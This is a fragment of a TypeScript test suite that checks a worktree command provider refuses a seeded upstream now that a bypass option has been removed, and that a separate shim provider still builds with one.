  it('the worktree factory still builds normally over a factory-minted UNSEEDED repo — the flip', () => {
    // Branding is not banning: an authentic empty-trunk repo (the #120 seam) passes
    // the brand check and, with no `upstream`, the seed refusal too.
    expect(() =>
      createWorktreeCommandProvider({ repo: plain, command: ['bash', '-lc', 'true'] }),
    ).not.toThrow();
  });

  it('there is NO worktree option that builds a seeded upstream (the removed seam)', () => {
    // The round-3 escape hatch is gone at the TYPE level: `WorktreeCommandOptions`
    // no longer has a `containedUpstreamSeed` field, so a caller cannot even spell
    // the bypass. REVERT-REDS: re-add the optional boolean and this `@ts-expect-error`
    // becomes an unused directive — typecheck reds.
    expect(() =>
      createWorktreeCommandProvider({
        repo: seeded,
        artifactRepo,
        command: ['true'],
        // @ts-expect-error — the containment seam was removed in #141 r4; there is
        // no property by which the worktree provider runs a seeded upstream.
        containedUpstreamSeed: true,
      }),
    ).toThrow(WORKTREE_UPSTREAM_SEED_REFUSAL);
  });

  it('the shim NEEDS no opt-in for a seeded upstream — it runs no harness', () => {
    // r4 removal is worktree-only. The shim has no config-rewrite reach, so a
    // seeded shim with a distinct remote builds — this is the live caller that
    // keeps the seed plumbing reachable and tested.
    expect(() => createDeterministicShimProvider({ repo: seeded, artifactRepo })).not.toThrow();
  });
});
